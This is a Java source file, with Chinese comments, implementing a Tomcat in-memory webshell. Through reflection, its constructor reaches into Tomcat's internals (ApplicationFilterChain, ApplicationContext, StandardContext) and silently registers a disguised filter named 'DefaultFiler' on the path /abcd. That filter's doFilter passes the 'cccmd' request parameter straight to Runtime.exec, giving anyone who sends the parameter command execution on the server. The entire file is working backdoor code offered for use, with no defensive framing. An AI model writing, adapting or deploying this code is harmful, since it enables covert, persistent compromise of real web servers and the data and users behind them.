package org.example;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
// tomcat 8/9
//import org.apache.tomcat.util.descriptor.web.FilterMap;
//import org.apache.tomcat.util.descriptor.web.FilterDef;
// tomcat 7
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;

import javax.servlet.*;
import javax.servlet.Filter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;


public class AddFilter implements Filter {
    String name = "DefaultFiler";
    String injectURL = "/abcd";
    String shellParameter = "cccmd";
    AddFilter() {

        try {
            Class applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            Field WRAP_SAME_OBJECT = applicationDispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            WRAP_SAME_OBJECT.setAccessible(true);
            if (!WRAP_SAME_OBJECT.getBoolean(null)) {
                WRAP_SAME_OBJECT.setBoolean(null, true);
            }

            //初始化 lastServicedRequest
            Class applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field lastServicedRequest = applicationFilterChain.getDeclaredField("lastServicedRequest");
            modifiersField = lastServicedRequest.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedRequest.setAccessible(true);
            if (lastServicedRequest.get(null) == null) {
                lastServicedRequest.set(null, new ThreadLocal<>());
            }

            //初始化 lastServicedResponse
            Field lastServicedResponse = applicationFilterChain.getDeclaredField("lastServicedResponse");
            modifiersField = lastServicedResponse.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            lastServicedResponse.setAccessible(true);
            if (lastServicedResponse.get(null) == null) {
                lastServicedResponse.set(null, new ThreadLocal<>());
            }


            Field lastServicedRequest2 = applicationFilterChain.getDeclaredField("lastServicedRequest");
            lastServicedRequest2.setAccessible(true);
            ThreadLocal thredLocal = (ThreadLocal) lastServicedRequest2.get(null);


            /*shell注入，前提需要能拿到request、response等*/
            if (thredLocal != null && thredLocal.get() != null) {
                ServletRequest servletRequest = (ServletRequest) thredLocal.get();
                ServletContext servletContext = servletRequest.getServletContext();



                Field appctx = servletContext.getClass().getDeclaredField("context");  // 获取属性
                appctx.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  //从servletContext中获取context属性->applicationContext

                Field stdctx = applicationContext.getClass().getDeclaredField("context");  // 获取属性
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  // 从applicationContext中获取context属性->standardContext，applicationContext构造时需要传入standardContext

                Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");  //获取属性
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);  // 从standardContext中获取filterConfigs属性，将filterConfig加入这个这个map即可
                // 以上反射获取的成员属性都是接口实例的

                if (filterConfigs.get(name) == null) {
                    AddFilter filter = new AddFilter("aaa");

                    FilterDef filterDef = new FilterDef();  // 组装filter各类信息和对象本身加载到标准的filterDef对象
                    filterDef.setFilterName(name);
                    filterDef.setFilterClass(filter.getClass().getName());
                    filterDef.setFilter(filter);
                    standardContext.addFilterDef(filterDef);  // 将filterDef 添加到filterDefs中

                    FilterMap filterMap = new FilterMap();
                    filterMap.addURLPattern(injectURL);
                    filterMap.setFilterName(name);
                    filterMap.setDispatcher(DispatcherType.REQUEST.name());  // 关键点就在于tomcat>=7以上才有这个
                    standardContext.addFilterMapBefore(filterMap);  // 组装filterMap 添加到filterMaps中

                    //在方法名中加Declared的是返回所有的构造方法，不加Declared的只返回public访问权限的构造器
                    //反射机制中，所有添加Declared的获取方式都是暴力获取所有构造（或方法，或字段），通过暴力获取的字段我们在进行访问的时候需要进行可访问性设置，即获取的反射对象.setAccessible(true);否则只是获取而无法操作
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

                    filterConfigs.put(name, filterConfig);  //在filterConfigs中添加定义好的filterConfig

                }
                ;

            }
        } catch (NoSuchMethodException | InstantiationException | InvocationTargetException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public AddFilter(String aaa) {
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    /**
     * The core method of the Filter interface. This method is called by the
     * web container each time a request/response pair is passed through the
     * chain due to a client request for a resource at the end of the chain.
     * The FilterChain passed in to this method allows the Filter to pass
     * on the request and response to the next entity in the chain.
     * <p>
     * A typical implementation of this method would follow the following
     * pattern:
     * <ol>
     * <li>Examine the request and response to see if the filter needs to
     * be applied.</li>
     * <li>If the filter needs to be applied, call {@link
     * #doFilter(ServletRequest, ServletResponse, FilterChain)} with the
     * passed in ServletRequest and ServletResponse objects.</li>
     * <li>If the filter does not need to be applied, just call {@link
     * FilterChain#doFilter(ServletRequest, ServletResponse)}.</li>
     * </ol>
     * <p>
     * A filter should not invoke this method again on the same request
     * after it has either invoked the next entity in the chain or
     * thrown an exception.
     * <p>
     * The default implementation of this method is to simply call the
     * next entity in the chain.
     * <p>
     * This method is not thread-safe. Filters that wish to be invoked
     * at each request/response pair, rather than at each invocation of
     * the chain, must be thread-safe.
     *
     * @param servletRequest  the <code>ServletRequest</code> object contains the
     *                         client's request
     * @param servletResponse  the <code>ServletResponse</code> object contains the
     *                         filter's response
     * @param filterChain      the <code>FilterChain</code> for invoking the next
     *                         filter or the resource
     *
     * @exception IOException if an I/O error occurs
     * @exception ServletException if the request for the WEB resource
     *                            fails
     */
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse resp = (HttpServletResponse) servletResponse;
        if (req.getParameter(this.shellParameter) != null) {
            Runtime.getRuntime().exec(req.getParameter(this.shellParameter));
            resp.getWriter().write("执行完毕");

        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
